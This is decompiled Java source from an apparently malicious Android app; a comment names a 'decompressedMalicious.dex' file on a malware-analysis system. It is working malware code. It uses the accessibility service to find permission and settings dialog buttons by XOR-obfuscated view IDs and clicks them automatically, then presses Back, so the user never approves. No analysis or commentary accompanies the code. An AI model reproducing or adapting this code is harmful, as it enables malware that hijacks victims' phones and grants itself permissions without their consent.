package com.zjxyxnvvp.nxvxchltf.util;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import java.util.Iterator;
import java.util.List;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class c {
    private static short[] $ = {3552, 3564, 3566, 3501, 3554, 3565, 3559, 3569, 3564, 3562, 3559, 3501, 3568, 3558, 3575, 3575, 3562, 3565, 3556, 3568, 3513, 3562, 3559, 3500, 3554, 3552, 3575, 3562, 3564, 3565, 3548, 3553, 3574, 3575, 3575, 3564, 3565, 9264, 9279, 9269, 9251, 9278, 9272, 9269, 9323, 9272, 9269, 9342, 9267, 9252, 9253, 9253, 9278, 9279, 9312, 4104, 4100, 4102, 4165, 4102, 4098, 4126, 4098, 4165, 4120, 4110, 4104, 4126, 4121, 4098, 4127, 4114, 4104, 4110, 4101, 4127, 4110, 4121, 4177, 4098, 4111, 4164, 4106, 4104, 4104, 4110, 4123, 4127, 2898, 2910, 2908, 2847, 2896, 2911, 2901, 2883, 2910, 2904, 2901, 2847, 2881, 2900, 2883, 2908, 2904, 2882, 2882, 2904, 2910, 2911, 2898, 2910, 2911, 2885, 2883, 2910, 2909, 2909, 2900, 2883, 2827, 2904, 2901, 2846, 2881, 2900, 2883, 2908, 2904, 2882, 2882, 2904, 2910, 2911, 2926, 2896, 2909, 2909, 2910, 2886, 2926, 2899, 2884, 2885, 2885, 2910, 2911, 8819, 8831, 8829, 8766, 8817, 8830, 8820, 8802, 8831, 8825, 8820, 8766, 8800, 8817, 8819, 8827, 8817, 8823, 8821, 8825, 8830, 8803, 8804, 8817, 8828, 8828, 8821, 8802, 8746, 8825, 8820, 8767, 8800, 8821, 8802, 8829, 8825, 8803, 8803, 8825, 8831, 8830, 8783, 8817, 8828, 8828, 8831, 8807, 8783, 8818, 8805, 8804, 8804, 8831, 8830, 6684, 6701, 6704, 6716, 6686, 6689, 6701, 6719};

    /* renamed from: a */
    public static int f363a;

    /* renamed from: b */
    private static long f364b;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static boolean a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (accessibilityNodeInfo != null) {
            String[] strArr = {$(0, 37, 3459), $(37, 55, 9297), $(55, 88, 4203), $(88, 147, 2865), $(147, 202, 8720)};
            for (int i = 0; i < 5; i++) {
                Iterator<AccessibilityNodeInfo> it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(strArr[i]).iterator();
                if (it.hasNext()) {
                    AccessibilityNodeInfo next = it.next();
                    if (a.h != Long.MAX_VALUE) {
                        StringBuilder sb = new StringBuilder();
                        List<CharSequence> text = accessibilityEvent.getText();
                        if (text != null) {
                            for (CharSequence charSequence : text) {
                                if (charSequence != null) {
                                    sb.append(charSequence);
                                }
                            }
                            for (AccessibilityNodeInfo accessibilityNodeInfo2 : b.b(accessibilityNodeInfo, $(202, 210, 6728))) {
                                if (accessibilityNodeInfo2.getText() != null) {
                                    sb.append(accessibilityNodeInfo2.getText());
                                }
                            }
                            if (sb.toString().toLowerCase().contains(b.l(accessibilityService).toLowerCase()) && sb.toString().contains(g.n())) {
                                return false;
                            }
                        }
                    }
                    next.performAction(16);
                    next.performAction(16);
                    next.performAction(16);
                    a.j = true;
                    accessibilityService.performGlobalAction(1);
                    f363a--;
                    return true;
                }
            }
        }
        return false;
    }

    public static void b() {
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - f364b > 13000) {
            f363a = 0;
        }
        f364b = currentTimeMillis;
        int i = f363a;
        if (i < 5) {
            f363a = i + 1;
        }
    }

    public static void c(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        if (f363a > 0 && System.currentTimeMillis() - f364b < 13000 && accessibilityEvent.getPackageName() != null) {
            a(accessibilityService, accessibilityEvent);
        }
    }
}
